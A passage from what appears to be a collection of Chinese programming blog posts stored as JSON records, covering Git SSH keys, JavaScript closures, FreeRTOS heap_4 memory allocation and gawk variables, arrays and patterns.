.ssh/id_rsa），然后它会要求你输入两次密钥口令。如果你不想在使用密钥时输入口令，将其留空即可。\n现在，进行了上述操作的用户需要将各自的公钥发送给任意一个 Git 服务器管理员（假设服务器正在使用基于公钥的 SSH 验证设置）。 他们所要做的就是复制各自的 .pub 文件内容，并将其通过邮件发送。 公钥看起来是这样的：\n$ cat ~/.ssh/id_rsa.pub\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAklOUpkDHrfHY17SbrmTIpNLTGK9Tjom/BWDSU\nGPl+nafzlHDTYW7hdI4yZ5ew18JH4JW9jbhUFrviQzM7xlELEVf4h9lFX5QVkbPppSwg0cda3\nPbv7kOdJ/MTyBlWXFCR+HAo3FXRitBqxiX1nKhXpHAZsMciLq8V6RjsNAQwdsdMFvSlVK/7XA\nt3FaoJoAsncM1Q9x5+3V0Ww68/eIFmb1zuUFljQJKprrX88XypNDvjYNby6vw/Pb0rwert/En\nmZ+AW4OZPnTPI89ZPmVMLuayrD2cE86Z/il8b+gw3r3+1nKatmIkjn2so1d01QraTlMqVSsbx\nNrRFi9wrf+M7Q== schacon@mylaptop.local\n在你的 Github 账户中，依次点击 Settings > SSH and GPG keys > New SSH key\n然后，将上面生成的公钥内容粘贴到 Key 编辑框并保存。至此大功告成。\n后面，你在克隆你的 Github 项目时使用 SSH 方式即可。\n\n如果觉得我的讲解还不够细致，可以参考：https://help.github.com/articles/adding-a-new-ssh-key-to-your-github-account/\n小结\n最后，放一张我总结的脑图总结一下以上的知识点。\n\n资料\ngit 官网 | git 官方 Github\n廖雪峰的 git 教程\ngit-cheat-sheet\ngithub-cheat-sheet\nGithub gitignore 模板\n"},{"title":"JavaScript--我发现，原来你是这样的JS：函数表达式和闭包","body":"一、介绍\n\n本次博客主要介绍函数表达式的内容，主要是闭包。\n\n二、函数表达式\n\n定义函数的两种方式：一个是函数声明，另一个就是函数表达式。\n\n\n//1.函数声明写法\nfunction fn2(){\n    console.log('函数声明');  \n}\n//2.函数表达式写法\nvar fn1 = function(){\n    console.log('函数表达式');\n}\n区别：\n1.函数声明是用function后面有函数名，函数表达式是赋值形式给一个变量。\n2.函数声明可以提升函数，而函数表达式不会提升\n函数提升就是函数会被自动提升到最前方，以至于再调用函数后再声明函数也不会有错：\n//例子：\n//先调用运行\nsayName();\n//再声明函数\nfunction sayName(){\n    console.log('ry');\n}\n\n//运行结果\n'ry'\n函数表达式就不会被提升：\n//先调用\nsayBye();\n//函数表达式\nvar sayBye = function(){\n    console.log('bye bye');\n}\n\n//运行报错\n但是下面的写法很危险：因为存在函数声明的提升\n//书上代码\nif(condition){\n    function sayHi(){\n        console.log('hi');\n    }\n}\nelse{\n    function sayHi(){\n        console.log('yo');\n    }\n}\n解说一下： 这段代码想表达在condition为true时声明sayHi，不然就另一函数sayHi，但是运行结果往往出乎意料，在当前chrome或firefox可能能做到，但是在IE10以下的浏览器（我测试过）往往不会遵循你的意愿，不管condition是true还是false都会输出yo。\n这时函数表达式能派上用场了：\n//换成函数表达式，没问题因为不会被提升，只有当执行时才赋值\nvar sayHi = null;\nif(condition){\n    sayHi = function (){\n        console.log('hi');\n    }\n}\nelse{\n    sayHi = function sayHi(){\n        console.log('yo');\n    }\n}\n三、闭包\n\n闭包的定义：有权访问另一个函数作用域中的变量的函数\n\n有人觉得闭包很难理解，一开始我也是这样的，我认为那是对一些概念还不够了解。\n定义中说明了什么是闭包，最常见的形式就是在函数中再声明一个函数。\n重点理解这里：\n1.闭包能访问外围函数的变量是因为其作用域链中有外围函数的活动对象（这个活动对象即使在外围函数执行完还会存在，不会被销毁，因为被闭包引用着）。\n2.闭包是函数中的函数，也就是说其被调用时也创建执行上下文，对于执行上下文这部分可以看看这篇：深入理解js执行--创建执行上下文这篇博客。\n理解了上面之后我们再来看闭包的例子：\nfunction a(){\n    //a函数的变量\n    var val_a = \"我是a函数里的变量\";\n    //声明函数b，b能访问函数a的变量\n    function b(){\n        console.log(val_a);\n    }\n    //a函数将b返回\n    return b;\n}\n\n//全局变量fn，a执行返回了b给fn\nvar fn = a();\n//调用fn，能够在全局作用域访问a函数里的变量\nfn();  //我是a函数里的变量\n\n这里fn能够访问到a的变量，因为b中引用着a的活动对象，所以即使a函数执行完了，a的活动对象还是不会被销毁的。这也说明过度使用闭包会导致内存泄漏。\n\n再来个常见的例子（给多个li添加点击事件，返回对于li的下标）：\n<body>\n    <ul id=\"list\">\n        <li>red</li>\n        <li>green</li>\n        <li>yellow</li>\n        <li>black</li>\n        <li>blue</li>\n    </ul>\n</body>\n//获得li标签组\nvar li_group = document.getElementsByTagName('li');\n\n//错误例子:每个li都会跳出5\nfunction fn(){\n    //为每一个li添加点击事件\n    var i = 0;\n    //使用for来给每个li添加事件\n    for(;i<li_group.length;i++){\n        //添加点击事件\n        li_group[i].addEventListener('click',function(){\n            // 输出对应得下标\n            console.log(i);\n        });\n    }\n}\nfn();\n\n\n//正确的例子：\n//在加一层的函数，作为闭包，用来保存每一次循环的i变量，就可以达到目的\nfunction correctFn(){\n    var i = 0;\n    for(;i<li_group.length;i++){\n        //在外面套一层函数，这层函数会保存每次循环的i变量，也就是闭包了。\n        (function(num){\n            li_group[num].addEventListener('click',function(){\n                console.log(num);\n            });               \n        }(i));        \n    }\n}\ncorrectFn();\n看下面解释之前我默认你已经知道活动对象是什么了，如果不懂可以看这篇：深入理解js执行--创建执行上下文\n解释一下：\n1.错误的例子:\n屡一下思路，每个li都有click执行的函数，每个函数点击后才会执行是吧，那每个click的函数的外层函数是fn这个函数，那这5个click函数都会保存着fn的活动对象，那这个输出的i变量在fn这函数里面，所以当fn执行完后，i的值是5了，因此当每个里触发click的函数的时候输出的也就是5了。\n再简单的说：每个li的click事件触发的函数引用的i在同一个活动对象中，所以值都一样。\n2.正确执行的例子：\n我们就在外层加了一层匿名函数并立即执行(虽然函数被执行了，如果有函数引用着它的活动对象，那其活动对象将不灭)，这时每个li的click函数外层函数是每次循环产生的不同的匿名函数，这匿名也是有活动对象，每个li的click的函数保存着各自的匿名函数的活动对象，num这变量也根据每次循环产生不同的匿名函数传入的i的不同而不同，所以能够输出对应不同的值。\n\n上面说的可能有点啰嗦，请原谅我[捂脸.jpg]，我是希望尽可能的表达清楚。如果你看懂了，那对闭包的理解也更深一层了哦。\n\n小结：\n\n1.本篇主要讲的是闭包，闭包是有权访问另一个函数作用域中的变量的函数，主要是函数中的函数，因为能引用外层函数的活动对象所以能够访问其外层的变量。\n2.我本篇主要讲的是原理，如果对一些东西不懂，可以看下面几篇。\n\n\n相关的几篇：\n深入理解js执行--单线程的JS\n深入学习JS执行--创建执行上下文（变量对象，作用域链，this）\n我发现，原来你是这样的JS全部文章汇总（点击此处）\n\n\n本文出自博客园：http://www.cnblogs.com/Ry-yuan/\n作者：Ry（渊源远愿）\n欢迎访问我的个人首页：我的首页\n欢迎访问我的github:https://github.com/Ry-yuan/demoFiles\n欢迎转载，转载请标明出处，保留该字段。\n\n"},{"title":"FreeRTOS--堆内存管理","body":"因为项目需要，最近开始学习FreeRTOS，一开始有些紧张，因为两个星期之前对于FreeRTOS的熟悉度几乎为零，经过对FreeRTOS官网的例子程序的摸索，和项目中问题的解决，遇到了很多熟悉的身影，以前在Linux平台编程的经历给了我一些十分有用的经验，后悔当初没能在第一家公司待下去，浪费了大好时光。好吧，现在还是潜下心来搞搞FreeRTOS吧。\n后续都是一系列FreeRTOS相关的随笔，先把FreeRTOS“圣经”--Mastering the FreeRTOS Real Time kernel -- A Hands On Tutorial Guide 20161204好好研读，接连的几个随笔都是我从这本“圣经”中翻译出来的。翻译难免有所疏漏、词不达意，大家凑合着看吧。\n从FreeRTOS V9.0.0开始FreeRTOS应用程序可以完全用静态分配内存，而没有必要引入堆内存管理。\n章节引言和范围\n前提\nFreeRTOS是以C源文件的形式提供的，因此成为一名合格的C语言编程人员是使用FreeRTOS的必要条件，因而这个章节假定读者熟悉以下概念：\n\nC语言项目是如何构建的，包含不同的编译和链接过程\n堆和栈分别是什么\n标准C库的malloc()和free()函数\n\n动态内存分配以及它和FreeRTOS的关系\n从FreeRTOS V9.0.0开始内核对象既可以在编译的时候静态分配，也可以在运行时动态分配。本书随后的章节将会介绍以下内核对象：tasks, queues, semaphores 和 event groups。为了尽可能让FreeRTOS易于使用，这些内核对象并不是在编译时静态分配的，而是在运行时动态分配的。内核对象创建时FreeRTOS分配RAM而在内核对象删除时释放内存。这样的策略减少了设计和计划上的努力，简化了API，并且减少了RAM的占用。\n动态内存分配是C语言编程的概念，而不是针对FreeRTOS或者多任务编程的概念。它和FreeRTOS是相关的，因为内核对象是动态分配的，并且通用编译器提供的动态内存分配方案对于实时应用程序并不总是适合的。\n内存可以使用标准C库的malloc()和free()函数来分配，但有可能不适合，或者恰当，因为下几点原因：\n\n在小型嵌入式系统中并不总是可用的\n它们的实现可能非常的大，占据了相当大的一块代码空间\n他们几乎都不是线程安全的\n它们并不是确定的，每次调用这些函数执行的时间可能都不一样\n它们有可能产生碎片\n它们有可能打乱链接器的配置\n如果允许堆空间的生长方向覆盖其他变量占据的内存，它们会成为debug的灾难\n\n动态内存分配的可选项\n从FreeRTOS V9.0.0开始内核对象既可以在编译时静态分配也可以在运行时动态分配。如今FreeRTOS把内存分配放在可移植层。这是认识到不同的嵌入式操作有不同的动态内存管理方法和时间要求，因此单个的动态内存分配算法将只适合于应用程序的一个子集。同样，从核心代码库中移除动态内存分配使得应用程序编写者提供自己的特定的实现，如果适合的话。\n当FreeRTOS需要RAM的时候，并不是调用malloc()，而是调用pvPortMalloc()。当需要释放RAM的时候，并不是调用free()，而是调用vPortFree()。pvPortMalloc()和标准C库的malloc()有同样的函数原型，vPortFree()和标准C库的free()有同样的函数原型。\npvPortMalloc() 和 vPortFree()都是公共函数，因此能够被应用代码调用。\nFreeRTOS对于pvPortMalloc()和vPortFree()提供了5种实现，后续章节会讲到。FreeRTOS应用程序可以使用其中的一种，或者使用自己的实现。5种实现分别在heap_1.c, heap_2.c, heap_3.c, heap_4.c 和 heap_5.c文件中，都存在于文件夹 FreeRTOS/Source/portable/MemMang 下。\n范围\n本章节致力于让读者深入理解：\n\nFreeRTOS何时分配RAM\nFreeRTOS 提供的5种内存分配方案\n选用哪一种内存分配方案\n\n内存分配方案示例\nHeap_4 （其他几种暂不去了解）\n和heap_1, heap_2 一样，heap_4也是把数组切割成更小的块。和前面一样，数组是静态声明的，由宏configTOTAL_HEAP_SIZE指定大小，所以这就使得即便数组中的内存还没有被分配出去就让应用程序显得消耗了大量的RAM。\nHeap_4使用了最先适应算法来分配内存。和heap_2不同，heap_4把临近的空闲的存储空间拼凑成一个更大的内存块，这就减少了内存碎片化的风险。\n最先适应算法确保了pvPortMalloc()使用第一块空闲的足够大的内存来满足要申请的字节数。考虑下面的情景：\n\n堆里有3块空闲内存块，它们的大小分别是5个字节，200个字节，100个字节\n调用pvPortMalloc()来申请20个字节的RAM\n满足字节数要求的第一块空闲RAM块是200个字节的RAM块，因此pvPortMalloc()把大小为200个字节的RAM块分割成两块，一块是20个字节，一块是180个字节，然会返回一个指向20个字节的指针。新的180个字节大小的RAM块将在后续的pvPortMalloc()调用中可用。\n\nFigure 7 演示了 heap_4 最先适应算法如何拼接内存，同样也演示了内存的分配和释放：\n\n\nA演示了创建3个任务之后的数组的样子，一大块空的块存在于数组的顶端。\nB演示了删除1个任务之后的数组，一大块空的块存在于数组的顶端。被删除的那个任务占据的TCB和栈存储空间现在是空的，并且它们拼接成一个大的空的块。\nC演示了FreeRTOS创建了一个Queue。队列是通过xQueueCreate() API 创建的，它是调用pvPortMalloc() 来分配存储空间的。由于heap_4采用最先适应算法，pvportMalloc()将会使用第一块大的足够容纳队列的RAM块来分配，在Figure 7中就采用之前删除任务的那一块。然而队列并不完全消耗那个空闲的区块，所以那个RAM块会分成两个部分，未使用的部分将会由后续的pvPortMalloc()占用。\nD演示了应用程序直接调用pvPortMalloc()而不是间接地由FreeRTOS API调用之后的情形。用户分配的区块足够小，能够放在第一个空闲的区块中，这个区块就是队列占用的区块和后面的TCB占用的区块之间的那一块。\n删除任务释放的内存，现在被分割成3个区块，第一个区块是队列，第二个区块是用户分配的，第三个区块还是空的。\nE 演示了队列删除之后，存储空间也自动释放了。现在用户分配的区块两边都是空闲区块。\nF 演示了用户分配的存储空间释放的情形。这个区块现在和两边的空闲区块拼接成了一个更大的空闲区块。\n\nHeap_4并不是确定性的，但是要比标准库函数实现的malloc()和free()运行的更快。\n设定Heap_4数组的起始地址\n此章节包含更高阶的信息，仅仅为了使用Heap_4是没有必要阅读和理解此章节的。\n某些时候应用程序开发者需要指定heap_4数组的起始地址位于某个特定的内存。例如，FreeRTOS 任务的栈是从堆中分配的，就有可能有必要保证堆是分配在快速的内存中，而不是慢速的外存。\n默认情况下，heap_4数组是在heap_4.c源文件中声明的，它的起始地址是由链接器自动确定的。然而，如果在文件FreeRTOSConfig.h中把编译时配置选项configAPPLICATION_ALLOCATED_HEAP设为常量1，那么数组必须由使用FreeRTOS的应用声明。如果把数组声明为应用的一部分，那么应用编写者可以指定数组的起始地址。\n如果把文件FreeRTOSConfig.h中的configAPPLICATION_ALLOCATED_HEAP设定为1，那么应用程序源文件中必须声明一个名字为ucHeap的uint8_t类型的数组，它的大小有configTOTAL_HEAP_SIZE设定。\n把变量放在某个内存地址的语法取决于使用了哪种编译器，下面演示了两种编译器的用法：\n\nListing 2演示的是GCC编译器声明数组并把数组放在名字为.my_heap的段中。\nListing 3演示的是IAR编译器把数组放在内存绝对地址0x20000000上。\n\n\nuint8_t ucHeap [configTOTAL_HEAP_SIZE] attribute (( section(\".my_heap\") ));\n\nListing 2\n\nuint8_t ucHeap [configTOTAL_HEAP_SIZE] @ 0x20000000;\n\nListing 3\n和堆相关的实用函数\nxPortGetFreeHeapSize() API\n这个函数可以获取调用时堆中空闲内存的大小，以字节为单位。使用它可以优化堆的大小。例如，当内核对象都创建完毕后调用xPortGetFreeHeapSize()返回2000，那么可以把configTOTAL_HEAP_SIZE减小2000.\n需要注意，当使用heap_3时是不能调用这个函数的。\nxPortGetMinimumEverFreeHeapSize() API\n此函数返回FreeRTOS应用程序开始运行之后曾经存在的最小的未被分配的存储空间的字节数。它的返回值指示了应用程序离将要耗尽堆空间的接近程度。例如xPortGetMinimunEverFreeHeapSize()返回200个字节，那么从应用程序开始运行之后的某个时间，在使用200个字节就会把堆空间用完。\n需要注意，xPortGetMinimumEverFreeHeapSize()只在使用heap_4或者heap_5时生效。\nMalloc 失败钩子函数\n应用程序可以直接调用pvPortMalloc()。当然在FreeRTOS源文件中每当内核对象创建时也会调用这个函数。此类的内核对象包括任务，队列，信号量和事件组。\n和标准库函数malloc()一样，如果pvPortMalloc()因为申请RAM的大小不能满足没能返回一块RAM空间就会返回NULL。如果编程人员调用pvPortMalloc()来创建内核对象，但是返回NULL就说明内核对象没有创建成功。\n例子中的所有堆分配方案都可以给pvPortMalloc()配置一个钩子函数（也称作回调函数），当pvPortMalloc()返回NULL时调用这个钩子函数。\n如果文件FreeRTOSConfig.h中的configUSE_MALLOC_FAILED_HOOK设置为1，那么应用程序必须提供一个内存分配失败时的钩子函数，它的名字和原型参见如下。只要对这个应用来说是合适的，这个钩子函数可以用任何方法来实现。\n\nvoid vApplicationMallocFailedHook( void );\n\n声明\n欢迎转载，请注明出处和作者，同时保留声明。\n作者：LinTeX9527\n出处：http://www.cnblogs.com/LinTeX9527/p/8007541.html\n本博客的文章如无特殊说明，均为原创，转载请注明出处。如未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。\n"},{"title":"《Linux命令行与shell脚本编程大全》第二十二章 gawk进阶","body":"gawk是一门功能丰富的编程语言，你可以通过它所提供的各种特性来编写好几程序处理数据。 \n22.1 使用变量\ngawk编程语言支持两种不同类型的变量：\n内建变量和自定义变量\n \n22.1.1 内建变量\ngawk程序使用内建变量来引用程序数据里的一些特殊功能\n \n1.字段和记录分隔符变量\n数据字段变量：允许你使用美元符和字段在该记录中的位置值来引用记录对应的字段。\n要引用第一个字段就用变量$1，第二个就用$2,….以此类推。\n \n数据字段是由分隔符来划定的。默认字段分隔符是一个空白字符，也就是空格或者制表符。\n \n有一组内建变量用于控制gawk如何处理输入输出数据中的字段和记录，见下表：\n\n\n\n\n变量\n\n\n描述\n\n\n\n\nFIELDWIDTHS\n\n\n有空格分隔的一列数字，定义每个数据字段的确切宽度\n\n\n\n\nFS\n\n\n输入字段分隔符\n\n\n\n\nRS\n\n\n输入记录分隔符\n\n\n\n\nOFS\n\n\n输出字段分隔符\n\n\n\n\nORS\n\n\n输出记录分隔符\n\n\n\n\n \n1）print命令会自动将OFS变量的值放置在输出中的每个字段间。\n实例：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1 \ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"; OFS=\"-\"} {print $1,$2,$3}' data1 \ndata11-data12-data13\ndata21-data22-data23\ndata31-data32-data33\ndata41-data42-data43\ndata51-data52-data53\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"; OFS=\"<-->\"} {print $1,$2,$3}' data1 \ndata11<-->data12<-->data13\ndata21<-->data22<-->data23\ndata31<-->data32<-->data33\ndata41<-->data42<-->data43\ndata51<-->data52<-->data53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n2） FIELDWIDTHS变量允许你不依靠字段分割符来读取记录。一旦这是了FILEDWIDTFS变量，gawk就会忽略FS变量。\n警告：一旦设定了FIELDWIDTHS变量的值，就不能再改变了。这种方法并不适用于变长的字段\n \n有写数据没有指定分隔符，而是放在特定的列，这时候就可以用FIELDWIDTHS了：\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data2\n1005.3246782.37\n115-2.343324.08\n05828.3452433.1\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FIELDWIDTHS=\"3 5 2 5\"} {print $1,$2,$3,$4}' data2\n100 5.324 67 82.37\n115 -2.34 33 24.08\n058 28.34 52 433.1\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n3）RS和ORS定义了gawk程序如何处理数据流中的字段。默认这两个都是换行符\n默认的RS表明，输入数据流中的每行新文本就是一条新记录\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\"\\n\";RS=\"\"} {print $1, $4}' data3\nkobe bryant 99038\nPaul Gaoso 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\"\\n\";RS=\"\"} {print $1, $2}' data3\nkobe bryant 24 Los Lakers\nPaul Gaoso 15 los Lakers\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n上面的例子中，4行才是一条记录，所以指定FS=”\\n”\n每行只是一个字段。\n如何判断一个新的数据行的开始：解决方法计算RS变量设为空。然后在数据记录之间留一个空白行。gawk会把每个空白行当做一个记录分隔符。\n \n说明：\n默认的字段分隔符是空格，记录分割符是换行符\n上面的例子把字段分割符改成了换行符，记录分隔符编程了空白行（RS=””）\n \n2. 数据变量\n还有一些其他的内建变量：\n\n\n\n\n变量\n\n\n描述\n\n\n\n\nARGC\n\n\n当前命令行参数个数\n\n\n\n\nARGIND\n\n\n当前文件在ARGV的位置\n\n\n\n\nARGV\n\n\n包含命令行参数的数组\n\n\n\n\nCONVFMT\n\n\n数字的转换格式，模式是%.6 g\n\n\n\n\nENVIRON\n\n\n当前shell环境变量及其值组成的关联数组\n\n\n\n\nERRNO\n\n\n当读取或关闭文件发生错误时的系统错误号\n\n\n\n\nFILENAME\n\n\n用作输入数据的数据文件的文件名\n\n\n\n\nFNR\n\n\n当前数据文件的数据行数\n\n\n\n\nIGNORECASE\n\n\n设成非零值，忽略gawk命令中出现的字符串的字符大小写\n\n\n\n\nNF\n\n\n数据文件中的字段总数\n\n\n\n\nNR\n\n\n已处理的输入记录数\n\n\n\n\nOFMT\n\n\n数字的输出格式，默认值%.6 g\n\n\n\n\nRLENGTH\n\n\n由match函数所匹配的字符串的长度\n\n\n\n\nRSTART\n\n\n由match函数所匹配的字符串的起始位置\n\n\n\n\n \n实例1：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ARGC,ARGV[1]}' data2\n2 data2\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ENVIRON[\"HOME\"]}'\n/home/xcy\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{print ENVIRON[\"HOME\"]; print ENVIRON[\"PATH\"]}'\n/home/xcy\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/sbin/:/usr/bin:/usr/sbin:/home/xcy/Bt_A7/Bt_A7/gcc-linaro-arm-linux-gnueabihf-4.9-2014.09_linux/bin\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n ENVIRON[“HOME”] 从系统中提取HOME环境变量的值。\n \n例子2：\n当要在gawk程序中跟踪数据字段和记录时，变量FNR，NF和NR就非常方便了。\nNF变量可以在你不知道具体位置的情况下指定记录中的最后一个数据字段：\n$gawk ‘BEGIN{FS=”:”; OFS=”:”} {print $1, $NF}’ /etc/passwd\n假设NF为7，那么相当于是$7。打印最后一个字段\n \n例子3：\nFNR变量含有当前数据文件中已处理过的记录数\nNR变量则含有已处理过的记录总数\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} {print $1,\"FNR=\"FNR}' data1 \ndata11 FNR=1\ndata21 FNR=2\ndata31 FNR=3\ndata41 FNR=4\ndata51 FNR=5\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} {print $1,\"FNR=\"FNR, \"NR=\"NR} END{print \"There were \",NR,\" recordes\"}' data1 data1\ndata11 FNR=1 NR=1\ndata21 FNR=2 NR=2\ndata31 FNR=3 NR=3\ndata41 FNR=4 NR=4\ndata51 FNR=5 NR=5\ndata11 FNR=1 NR=6\ndata21 FNR=2 NR=7\ndata31 FNR=3 NR=8\ndata41 FNR=4 NR=9\ndata51 FNR=5 NR=10\nThere were  10  recordes\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n当处理第2个文件时，FNR又被置成1了，但是NR还是继续增加的。\n \n注意：\n1）在shell脚本中使用gawk时，应该将gawk的命令放到不同的行，便于理解和阅读\n2）如果在不同的shell脚本中使用了相同的gawk脚本，应该把gawk放在一个单独的文件中。再用-f参数去引用它。\n \n \n22.1.2自定义变量\n变量名可以是字母下划线开头，还可以有数字。并且变量名区分大小写\n1.在脚本中给变量赋值\n可以对变量进行修改，可以进行数学运算\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> test=\"hahaha, i am test\"\n> print test}'\nhahaha, i am test\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\nBEGIN{\ntest=\"hahaha, i am test\"\nprint test\n> test=156\n> print test\n> }'\nhahaha, i am test\n156\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> x=4\n> x=x*3+4\n> print x\n> }'\n16\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n2. 在命令行上给变量赋值\n也可以用gawk命令行来给程序中的变量赋值。这允许你在正常的代码之外赋值。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script \nBEGIN{FS=\",\"}\n{print $n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script n=3 data1\ndata13\ndata23\ndata33\ndata43\ndata53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n上面可以给n进行赋值，改变脚本的行为。\n这样可以在不改变脚本代码的情况下就能改变脚本的行为\n上面这样存在的问题是设置的变量在代码的BEGIN部分不可用\n \n解决方法，用-v参数。它允许你在BEGIN代码之前设定变量，要放在脚本代码之前。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script2\nBEGIN{print \"The starting value is\",n; FS=\",\"}\n{print $n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -v n=4 -f script2 data1\nThe starting value is 4\ndata14\ndata24\ndata34\ndata44\ndata54\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.2 处理数组\ngawk编程语言使用关联数组提供数组功能\n关联数组跟数字数组不同之处在于它的索引值可以是任意文本字符串。\n不需要用连续的数字来标识数组元素。关联数组用各种字符串来引用值\n每个索引字符串都必须能够唯一标识赋给它的数据元素\n \n22.2.1 定义数组变量\n用标准赋值语句来定义数组变量。格式如下：\nvar[index]=element\nvar是变量名，index是关联数组的索引值 element是数据元素值\n例子：\n这里要加双引号，数字不用加，字符串需要加\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '                      \nBEGIN{\nnba[\"kobe\"]=\"bryant\"\nnba[\"cp3\"]=\"paul\"\nprint nba[\"kobe\"]\nprint nba[\"cp3\"]\n}'\nbryant\npaul\n# 还可以进行数学运算。\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk '\n> BEGIN{\n> arr[1]=99\n> arr[2]=77\n> total=arr[1] + arr[2]\n> print \"total =\",total\n> }'\ntotal = 176\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n22.2.2 遍历数组变量\n关联数组的索引可以是任何东西\n遍历数组可以用for语句的一种特殊形式：\nfor (var in array)\n{\n  statements\n}\n这个for语句会在每次循环时都将关联数组array的下一个索引值赋值给变量var，然后执行一遍statements\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script3\nBEGIN{\nvar[\"a\"]=\"hahah\"\nvar[\"b\"]=2\nvar[\"c\"]=\"yutong keche\"\nvar[\"d\"]=4\n \n \nfor (test in var)\n{\n         print \"Index:\",test,\" - Value:\",var[test]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script3\nIndex: a  - Value: hahah\nIndex: b  - Value: 2\nIndex: c  - Value: yutong keche\nIndex: d  - Value: 4\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.2.3删除数组变量\n格式如下：\ndelete array[index]\n删除以后就没办法再用它来提取元素值了。\n比如：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script4\nBEGIN{\nvar[\"a\"]=\"hahah\"\nvar[\"b\"]=2\nvar[\"c\"]=\"yutong keche\"\nfor (test in var)\n{\n         print \"old: Index:\",test,\" - Value:\",var[test]\n}\nprint \"Now,delete array:\"\ndelete var[\"c\"]\n \nfor (test in var)\n{\n         print \"new: Index:\",test,\" - Value:\",var[test]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script4\nold: Index: a  - Value: hahah\nold: Index: b  - Value: 2\nold: Index: c  - Value: yutong keche\nNow,delete array:\nnew: Index: a  - Value: hahah\nnew: Index: b  - Value: 2\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.3 使用模式\ngawk支持多种类型的匹配模式来过滤数据记录。\nBEGIN和END关键字用来读取数据流之前或之后执行命令的特殊模式\n \n22.3.1 正则表达式\n可以用基础正则表达式（BRE）或扩展正则表达式（ERE）来选择程序脚本作用在数据流中的哪些行上。\n \n使用正则表达式时，正则表达式必须出现在它要控制的程序脚本的左花括号前。\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script5\nBEGIN{FS=\",\"}\n/11/{print $1, $2}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script5 data1\ndata11 data12\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n正则表达式/11/匹配了字段中含有字符串11的记录。\n \n \n22.3.2 匹配操作符\n匹配操作符允许将正则表达式限定在记录中的特定数据字段。匹配操作符是~。\n可以指定匹配操作符，数据字段变量以及要匹配的正则表达式\n$1 ~ /^data/\n$1变量代表记录中的第一个数据字段。\n上面的例子会过滤出以data开头的所有记录。\n取反： $1 !~ /^data1/   匹配第一个字段不以data1开头的记录\n例子2：\n// 匹配第2个字段为data2开头的记录，并且打印第1和第3个字段。$2表示第2个字段\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1\ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} $2 ~ /^data2/{print $1, $3}' data1   data21 data23\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\",\"} $2 !~ /^data2/{print $1, $3}' data1  // 这里还可以取反，匹配第二个字段不以data2开头的记录。加个感叹号\ndata11 data13\ndata31 data33\ndata41 data43\ndata51 data53\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n例子3：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk 'BEGIN{FS=\":\"} $1 ~ /^xcy/{print $1,\":\" $NF}' /etc/passwd\nxcy :/bin/bash\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n例子4：! 用来排除正则表达式中的匹配\n\n$ gawk -F: '$1 !~ /^xcy|^root/{print $1, \":\" $NF}' /etc/passwd\n\n-F 用来指定主句字段的分隔符\n上面表明过滤第一个字段不以xcy开头，或不以root开头。\n \n22.3.3 数学表达式\n还可以在匹配模式中用数学表达式。\n例子：想显示所有属于root用户组（组ID为0）的系统用户\n$gawk –F: ‘$4 == 0{print $1}’ /etc/passwd\n还可以用任何常见的数学比较表达式： == 